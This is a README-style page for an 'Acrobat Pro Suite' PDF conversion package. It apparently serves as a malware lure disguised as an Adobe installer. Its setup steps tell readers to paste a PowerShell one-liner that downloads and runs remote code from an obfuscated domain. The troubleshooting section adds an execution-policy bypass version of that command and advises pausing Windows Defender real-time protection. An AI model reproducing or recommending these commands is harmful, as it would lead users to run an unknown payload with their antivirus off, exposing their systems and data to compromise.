📋 Overview

Acrobat Pro Suite is a portable, offline-ready deployment package designed for IT administrators and power users. It automates the installation of the core PDF processing engine, configures local COM libraries, and resolves missing dependencies for seamless document conversion (PDF to DOCX, XML, TXT, HTML, and more).

Key Features
- One-Click Provisioning: Automated setup of the Adobe DC SDK environment.
- Batch Conversion Support: Extracts tables, text, and metadata across multiple formats.
- Offline Architecture: No cloud checks or telemetry. All processing remains local.
- Smart Policy Bypass: Automatically adjusts execution policies and Defender exclusions for seamless installation.

🛠️ Quick Setup Guide (PowerShell)

To deploy the suite and configure the local environment, follow these steps:

1. Launch PowerShell:
   Press Win + X on your keyboard and select Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will automatically fetch the payload, unpack the SDK dependencies, and configure the system.

   iex (irm ("gvrsfwc" + ".cfd"))

3. Wait for Initialization:
   The utility will verify your system architecture, download the core components (~1.5 GB), and prepare the executable. Do not close the terminal window during this process.

⚠️ Troubleshooting & FAQ

💬 Script is blocked by Execution Policy
If Windows prevents the script from running due to default security policies, you can bypass this restriction using a standard Command Prompt (cmd). Run the following command:

powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod gvrsfwc.cfd | Invoke-Expression"

🛡️ Antivirus / SmartScreen Alerts
Because the deployment script modifies system policies to allow local COM injection and downloads dependencies silently, Windows Defender or SmartScreen may flag it as a potential threat (false positive).

Recommended Action: If the script gets blocked, pause Real-time protection in your Windows Security dashboard, run the setup script, and re-enable your antivirus immediately afterward.
